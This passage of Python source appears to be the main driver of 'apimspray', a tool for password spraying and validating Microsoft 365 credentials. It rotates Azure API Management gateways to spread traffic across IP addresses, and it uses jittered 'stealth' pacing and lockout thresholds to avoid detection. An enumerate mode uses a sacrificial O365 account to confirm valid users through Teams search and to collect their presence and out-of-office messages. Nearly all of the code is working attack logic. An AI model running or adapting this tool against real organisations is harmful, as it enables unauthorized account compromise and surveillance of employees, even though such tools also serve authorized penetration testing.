    parser.add_argument("--urls", required=False, help="Path to APIM URLs file (login gateways, from apimspraycreate.py)")
    parser.add_argument("--teams-urls", required=False, help=(
        "Path to Teams APIM URLs file (teams gateways, from apimspraycreate_teams.py).\n"
        "If not provided in enumerate mode, Teams API calls go direct (no IP rotation for enum)."
    ))
    parser.add_argument("--users", help="Path to users file")
    parser.add_argument("--passwords", help="Path to passwords file")
    parser.add_argument("--output", default="results", help="Output directory")
    parser.add_argument("--tenant", default="common", help="Tenant ID or Domain")
    parser.add_argument("--domain", help="Append domain to users if missing")
    parser.add_argument(
        "--mode",
        required=True,
        choices=["spray", "validate", "enumerate"],
        help=(
            "Operation mode:\n"
            " - spray:      Test all passwords against all users (1:N) via APIM.\n"
            " - validate:   Perform 1:1 credential pair testing via APIM.\n"
            " - enumerate:  Enumerate valid users via Microsoft Teams external search\n"
            "               using a sacrificial O365 account. Auth traffic is routed\n"
            "               through login APIM gateways. Teams API traffic is routed\n"
            "               through Teams APIM gateways (--teams-urls) if provided."
        ),
    )
    parser.add_argument(
        "--pace",
        default="low",
        choices=["stealth", "low", "mid", "medium", "high"],
        help=(
            "Pacing profile for requests and lockout management:\n"
            " - high:    15 workers, 0.1s delay\n"
            " - medium:  5 workers,  1.0s delay, 10%% jitter\n"
            " - low:     2 workers,  5.0s delay, 20%% jitter\n"
            " - stealth: 1 worker,  30.0s delay, 40%% jitter"
        ),
    )
    parser.add_argument("--continue-on-success", action="store_true", help="Continue after finding valid credentials.")
    parser.add_argument("--randomize-users", action="store_true", help="Randomize user order before each round.")
    parser.add_argument("--verbose", action="store_true", help="Enable on-demand progress output (press Enter to see progress).")

    # Enumerate-specific arguments
    parser.add_argument("--sac-user", help="Sacrificial O365 username for Teams enumeration")
    parser.add_argument("--sac-pass", help="Sacrificial O365 password for Teams enumeration")
    parser.add_argument(
        "--teams-region",
        default=DEFAULT_TEAMS_REGION,
        choices=TEAMS_REGIONS,
        help=f"Teams API region hint (default: {DEFAULT_TEAMS_REGION}). Auto-detected after auth when possible.",
    )
    parser.add_argument("--no-presence", action="store_true", help="Skip presence/out-of-office fetching during enumeration (faster).")
    parser.add_argument("--skip-sanity", action="store_true", help="Skip the pre-enumeration sanity check.")

    args = parser.parse_args()

    # ---- ENUMERATE MODE ----
    if args.mode == "enumerate":
        _run_enumerate(args)
        return

    # ---- SPRAY / VALIDATE MODES (original logic) ----
    if not args.urls or not Path(args.urls).exists() or os.stat(args.urls).st_size == 0:
        print_warn("No URLs provided or file is empty.")
        if sys.stdin.isatty():
            try:
                choice = input("Would you like to deploy new APIM resources now? [y/N]: ").strip().lower()
                if choice in ('y', 'yes'):
                    print_info("Launching apimspraycreate.py...")
                    try:
                        subprocess.run(
                            [sys.executable, "apimspraycreate.py", "--count", "33", "--outfile", "urls.txt"],
                            check=True
                        )
                        args.urls = "urls.txt"
                    except subprocess.CalledProcessError:
                        print_error("Failed to create APIM resources.")
                        sys.exit(1)
                else:
                    print_error("Aborted by user.")
                    sys.exit(1)
            except KeyboardInterrupt:
                sys.exit(1)
        else:
            print_error("Non-interactive mode: Please provide --urls with valid file.")
            sys.exit(1)

    urls = load_file_lines(args.urls)
    if not urls:
        print_error("No URLs found in provided file.")
        sys.exit(1)

    apim_manager = APIMManager(urls)

    users = []
    if args.users:
        users = load_file_lines(args.users)
        users = normalize_users(users, args.domain)
        if args.randomize_users:
            random.shuffle(users)
            print_info(f"User list randomized ({len(users)} users shuffled)")

    passwords = []
    if args.passwords:
        passwords = load_file_lines(args.passwords)

    targets = []
    if args.mode == "validate":
        if not users or not passwords:
            print_error("Validate mode requires --users and --passwords")
            sys.exit(1)
        if len(users) != len(passwords):
            print_error("Validate mode requires equal number of users and passwords (1:1 mapping)")
            sys.exit(1)
        targets = [Target(u, p) for u, p in zip(users, passwords)]

    logger = Logger(args.output)
    pace_config = PACE_SETTINGS[args.pace]
    workers = pace_config["workers"]
    base_delay = pace_config["delay"]

    print_info(f"Starting apimspray")
    print_info(f"Mode: {style(args.mode, TermColors.MAGENTA, TermColors.BOLD)}")
    if args.mode == "spray":
        print_info(f"Users: {style(str(len(users)), TermColors.MAGENTA, TermColors.BOLD)}")
        print_info(f"Passwords: {style(str(len(passwords)), TermColors.MAGENTA, TermColors.BOLD)}")
    else:
        print_info(f"Targets: {style(str(len(targets)), TermColors.MAGENTA, TermColors.BOLD)}")
    print_info(f"Gateways: {style(str(len(urls)), TermColors.MAGENTA, TermColors.BOLD)} (rotating)")
    print_info(f"Workers: {style(str(workers), TermColors.MAGENTA, TermColors.BOLD)}, Delay: {style(f'{base_delay}s', TermColors.MAGENTA, TermColors.BOLD)}")
    if args.randomize_users:
        print_info(f"User Randomization: {style('ENABLED', TermColors.GREEN, TermColors.BOLD)}")
    if args.verbose:
        print_info(f"Verbose Progress: {style('ENABLED', TermColors.GREEN, TermColors.BOLD)}")

    locked_users_set = set()
    invalid_users_set = set()
    lockout_counts = {}
    lock = threading.Lock()
    stop_event = threading.Event()
    progress_tracker = ProgressTracker() if args.verbose else None

    def run_assessment(target_list, progress_label=None):
        if stop_event.is_set():
            return
        if progress_tracker:
            progress_tracker.begin_round(len(target_list), label=progress_label or "Spraying")
        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = []
            for target in target_list:
                if stop_event.is_set():
                    break
                current_delay = base_delay
                if pace_config["jitter"] > 0 and base_delay > 0:
                    jitter_val = (base_delay * pace_config["jitter"]) / 100.0
                    current_delay += random.uniform(-jitter_val, jitter_val)
                    current_delay = max(0, current_delay)
                if current_delay > 0 and workers == 1:
                    time.sleep(current_delay)
                future = executor.submit(
                    process_attempt, target, apim_manager, args.tenant, pace_config,
                    logger, locked_users_set, invalid_users_set, lockout_counts,
                    lock, args.continue_on_success, stop_event,
                )
                futures.append(future)
            for f in as_completed(futures):
                try:
                    f.result()
                except Exception:
                    pass
                finally:
                    if progress_tracker:
                        progress_tracker.increment()
        if progress_tracker:
            progress_tracker.end_round()

    if args.mode == "validate":
        if args.randomize_users:
            random.shuffle(targets)
        if progress_tracker:
            progress_tracker.begin_session(len(targets))
        run_assessment(targets, progress_label="Validating")
        if progress_tracker:
            progress_tracker.end_session()
    elif args.mode == "spray":
        if not users or not passwords:
            print_error("Spray mode requires --users and --passwords")
            sys.exit(1)
        if progress_tracker:
            progress_tracker.begin_session(len(users) * len(passwords))
        pass_chunk_size = pace_config["count"]
        pass_chunks = [passwords[i:i + pass_chunk_size] for i in range(0, len(passwords), pass_chunk_size)]
        for i, chunk in enumerate(pass_chunks):
            if stop_event.is_set():
                break
            if sys.stdout.isatty():
                print("\033[2K\r", end="", flush=True)
            print_info(f"Spraying password chunk {i+1}/{len(pass_chunks)}: {', '.join(chunk)}")
            for password in chunk:
                if stop_event.is_set():
                    break
                with lock:
                    if len(locked_users_set) >= pace_config["safe"]:
                        print_error(f"Safe threshold reached ({pace_config['safe']} lockouts). Terminating.")
                        if progress_tracker:
                            progress_tracker.end_session()
                        _print_summary(logger, locked_users_set, invalid_users_set)
                        sys.exit(1)
                current_targets = [Target(u, password) for u in users if u not in locked_users_set and u not in invalid_users_set]
                if args.randomize_users:
                    random.shuffle(current_targets)
                run_assessment(current_targets, progress_label=f"Password: {password}")
                if stop_event.is_set():
                    break
            if i < len(pass_chunks) - 1:
                lockout_wait = pace_config["lockout"]
                if stop_event.is_set():
                    break
                print_info(f"Waiting {lockout_wait} minutes for lockout reset... (Hit Enter to skip)")
                wait_with_countdown(lockout_wait * 60, allow_skip=True)
        if progress_tracker:
            progress_tracker.end_session()

    _print_summary(logger, locked_users_set, invalid_users_set)


def _run_enumerate(args):
    """Execute Teams-based user enumeration through APIM gateways."""
    if not args.sac_user or not args.sac_pass:
        print_error("Enumerate mode requires --sac-user and --sac-pass (sacrificial O365 account)")
        sys.exit(1)
    if not args.users:
        print_error("Enumerate mode requires --users (file of candidate email addresses)")
        sys.exit(1)

    login_urls = []
    if args.urls and Path(args.urls).exists():
        login_urls = load_file_lines(args.urls)
    if not login_urls:
        print_error("Enumerate mode requires --urls with login APIM gateways for sacrificial auth")
        sys.exit(1)

    login_apim = APIMManager(login_urls)

    teams_apim = None
    if args.teams_urls and Path(args.teams_urls).exists():
        teams_urls = load_file_lines(args.teams_urls)
        if teams_urls:
            teams_apim = TeamsAPIMManager(teams_urls)
            print_info(f"Teams APIM gateways: {style(str(len(teams_urls)), TermColors.MAGENTA, TermColors.BOLD)} (rotating)")
        else:
            print_warn("Teams URLs file is empty -- Teams API calls will go direct")
    else:
        print_warn("No --teams-urls provided -- Teams API calls will go direct (no IP rotation for enum)")

    users = load_file_lines(args.users)
    users = normalize_users(users, args.domain)
    if not users:
        print_error("No users loaded from file")
        sys.exit(1)
    if args.randomize_users:
        random.shuffle(users)
        print_info(f"User list randomized ({len(users)} users shuffled)")

    logger = Logger(args.output)

    # Use enumerate-specific pacing (much faster than spray pacing — no lockout risk)
    enum_pace = ENUM_PACE_SETTINGS[args.pace]
    workers = enum_pace["workers"]
    base_delay = enum_pace["delay"]

    print_info(f"Starting apimspray")
    print_info(f"Mode: {style('enumerate', TermColors.MAGENTA, TermColors.BOLD)} (Teams User Enumeration)")
    print_info(f"Sacrificial Account: {style(args.sac_user, TermColors.CYAN)}")
    print_info(f"Candidate Users: {style(str(len(users)), TermColors.MAGENTA, TermColors.BOLD)}")
    print_info(f"Login Gateways: {style(str(len(login_urls)), TermColors.MAGENTA, TermColors.BOLD)} (rotating)")
    print_info(f"Workers: {style(str(workers), TermColors.MAGENTA, TermColors.BOLD)}, Delay: {style(f'{base_delay}s', TermColors.MAGENTA, TermColors.BOLD)}")
    if not args.no_presence:
        print_info(f"Presence/OOO Fetch: {style('ENABLED (post-enum pass)', TermColors.GREEN, TermColors.BOLD)}")
    else:
        print_info(f"Presence/OOO Fetch: {style('DISABLED', TermColors.YELLOW, TermColors.BOLD)}")

    enumerator = TeamsEnumerator(login_apim, teams_apim, region=args.teams_region)

    print_info("Authenticating sacrificial account via APIM...")
    if not enumerator.authenticate_sacrificial(args.sac_user, args.sac_pass, args.tenant):
        print_error("Failed to authenticate sacrificial account. Check credentials and APIM gateways.")
        sys.exit(1)

    print_info("Acquiring Skype token...")
    if not enumerator.acquire_skype_token():
        print_error("Failed to acquire Skype token. The sacrificial account may not have a Teams license.")
        sys.exit(1)

    if not args.skip_sanity:
        sample_domain = users[0].split("@")[1] if "@" in users[0] else args.domain
        if sample_domain:
            if not enumerator.sanity_check(sample_domain):
                print_error("Aborting enumeration -- sanity check failed. Use --skip-sanity to override.")
                sys.exit(1)
        else:
            print_warn("Cannot determine domain for sanity check -- skipping")

    valid_users_set = set()
    valid_mris = {}  # email -> mri, collected for post-enum presence pass
    lock = threading.Lock()
    stop_event = threading.Event()
    progress_tracker = ProgressTracker() if args.verbose else None
    if progress_tracker:
        progress_tracker.begin_session(len(users))
        progress_tracker.begin_round(len(users), label="Enumerating")

    print_info(f"Beginning enumeration of {len(users)} candidate users...")

    # Phase 1: Fast enumeration using a sliding window.
    # Submit work in chunks so we don't create 248K futures upfront.
    # Results are processed as they complete, keeping the progress bar moving.
    with ThreadPoolExecutor(max_workers=workers) as executor:
        pending = set()
        user_iter = iter(users)
        # Fill the initial window: 2x workers keeps the pool saturated
        window_size = workers * 2

        def _submit_next():
            """Submit the next user from the iterator. Returns True if submitted."""
            if stop_event.is_set():
                return False
            try:
                email = next(user_iter)
            except StopIteration:
                return False
            # Only apply delay in stealth mode
            if base_delay > 0 and workers == 1:
                current_delay = base_delay
                if enum_pace["jitter"] > 0:
                    jitter_val = (base_delay * enum_pace["jitter"]) / 100.0
                    current_delay += random.uniform(-jitter_val, jitter_val)
                    current_delay = max(0, current_delay)
                time.sleep(current_delay)
            future = executor.submit(
                process_enum_attempt, email, enumerator, enum_pace,
                logger, valid_users_set, valid_mris, lock, stop_event,
            )
            pending.add(future)
            return True

        # Prime the window
        for _ in range(window_size):
            if not _submit_next():
                break

        # Process completed futures and backfill new work
        while pending:
            done, pending = wait(pending, timeout=0.5, return_when=FIRST_COMPLETED)
            for f in done:
                try:
                    f.result()
                except Exception as e:
                    print_warn(f"Enum worker error: {e}")
                finally:
                    if progress_tracker:
                        progress_tracker.increment()
                # Backfill: submit one new task for each completed one
                _submit_next()

    if progress_tracker:
        progress_tracker.end_round()
        progress_tracker.end_session()

    # Phase 2: Presence/OOO pass (only for valid users, runs after enum completes)
    if not args.no_presence and valid_mris:
        print_info(f"Fetching presence/OOO for {style(str(len(valid_mris)), TermColors.GREEN, TermColors.BOLD)} valid users...")
        presence_workers = min(20, len(valid_mris))

        def _fetch_and_log_presence(email, mri):
            ooo = enumerator._fetch_presence(mri)
            if ooo and (ooo.get("message") or ooo.get("availability")):
                presence_str = ooo.get("availability", "")
                ooo_msg = ooo.get("message", "")
                display_parts = [email]
                if presence_str:
                    display_parts.append(f"[{presence_str}]")
                if ooo_msg:
                    display_parts.append(f"OOO: {ooo_msg[:80]}")
                console_msg = f"{style('[*]', TermColors.CYAN, TermColors.BOLD)} {' '.join(display_parts)}"
                print(console_msg)
                logger.log_enum_detail({
                    "timestamp": utc_now_str(),
                    "email": email,
                    "presence_update": True,
                    "presence": presence_str,
                    "out_of_office": ooo_msg,
                })

        with ThreadPoolExecutor(max_workers=presence_workers) as executor:
            presence_futures = []
            for email, mri in valid_mris.items():
                if mri:
                    presence_futures.append(executor.submit(_fetch_and_log_presence, email, mri))
            for f in as_completed(presence_futures):
                try:
                    f.result()
                except Exception:
                    pass

        print_success("Presence/OOO pass complete")

    _print_enum_summary(logger, valid_users_set, users)


def _print_summary(logger, locked_users, invalid_users):
    print("\n" + style("--- Assessment Summary ---", TermColors.BOLD, TermColors.CYAN))
    valid_count = sum(1 for _ in open(logger.files["valid"])) if logger.files["valid"].exists() else 0
    blocked_count = sum(1 for _ in open(logger.files["blocked"])) if logger.files["blocked"].exists() else 0
    failed_count = sum(1 for _ in open(logger.files["failed"])) if logger.files["failed"].exists() else 0
    print(f"Valid Credentials:   {style(str(valid_count), TermColors.GREEN, TermColors.BOLD)}")
    print(f"Locked/Blocked:      {style(str(blocked_count), TermColors.YELLOW, TermColors.BOLD)}")
    print(f"Failed Attempts:     {style(str(failed_count), TermColors.RED)}")
    print(f"Locked Users:        {len(locked_users)}")
    print(f"Invalid Users:       {len(invalid_users)}")
    print(f"Results Directory:   {style(str(logger.run_dir), TermColors.CYAN, TermColors.BOLD)}")
    print(style("--------------------------", TermColors.BOLD, TermColors.CYAN))


def _print_enum_summary(logger, valid_users, all_users):
    print("\n" + style("--- Enumeration Summary ---", TermColors.BOLD, TermColors.CYAN))
    enum_count = sum(1 for _ in open(logger.files["enumerated"])) if logger.files["enumerated"].exists() else 0
    failed_count = sum(1 for _ in open(logger.files["failed"])) if logger.files["failed"].exists() else 0
    print(f"Total Candidates:    {style(str(len(all_users)), TermColors.BOLD)}")
    print(f"Valid Users Found:   {style(str(enum_count), TermColors.GREEN, TermColors.BOLD)}")
    print(f"Errors:              {style(str(failed_count), TermColors.RED)}")
    print(f"Results Directory:   {style(str(logger.run_dir), TermColors.CYAN, TermColors.BOLD)}")
    if logger.files["enumerated"].exists():
        print(f"Valid Users File:    {style(str(logger.files['enumerated']), TermColors.GREEN)}")
    if logger.files["enum_details"].exists():
        print(f"Detailed JSON:       {style(str(logger.files['enum_details']), TermColors.GREEN)}")
    print(style("----------------------------", TermColors.BOLD, TermColors.CYAN))


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print_error("Interrupted by user")
        sys.exit(1)
